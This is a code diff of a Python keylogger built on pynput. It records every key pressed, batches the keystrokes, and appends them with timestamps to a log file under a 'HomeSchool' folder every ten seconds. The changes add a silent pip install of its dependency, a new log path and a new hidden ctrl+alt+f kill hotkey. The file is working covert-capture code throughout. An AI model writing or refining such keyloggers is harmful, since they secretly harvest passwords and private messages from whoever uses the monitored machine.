@@ -2,19 +2,25 @@ from pynput import keyboard, mouse
 from datetime import datetime as dt
 import time
 import threading
+import subprocess
 
 killSwitch = False
 currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
 letter = ''
 capsOn = False
-word = ''
+phrase = ''
+
+
+subprocess.call(['pip','install', 'pynput'])
 
 def update():
     while True:
-        global word
-        time.sleep(5)
-        writeToFile(word)
-        word = ''
+        global phrase
+        time.sleep(10)
+        if(phrase == ''):
+            continue
+        writeToFile(phrase)
+        phrase = ''
         if(killSwitch):
             return False
 
@@ -22,7 +28,7 @@ def update():
 threading.Thread(target=update).start()
 
 def writeToFile(text):
-    with open(r"C:\HomeSchool\testfile123.txt", 'a+') as f:
+    with open(r"C:\HomeSchool\folder123\appendtextfile.txt", 'a+') as f:
         try:
             f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
         except:
@@ -33,7 +39,7 @@ def writeToFile(text):
 def on_press(key):
     global capsOn
     global letter
-    global word
+    global phrase
     try:
         letter = '{0}'.format(key.char)
         if(capsOn):
@@ -84,7 +90,7 @@ def kill_prog():
 
 
 listener = keyboard.GlobalHotKeys({
-        '<ctrl>+<shift>+f+<up>+<down>': kill_prog})
+        '<ctrl>+<alt>+f': kill_prog})
 listener.start()
 
 with keyboard.Listener(
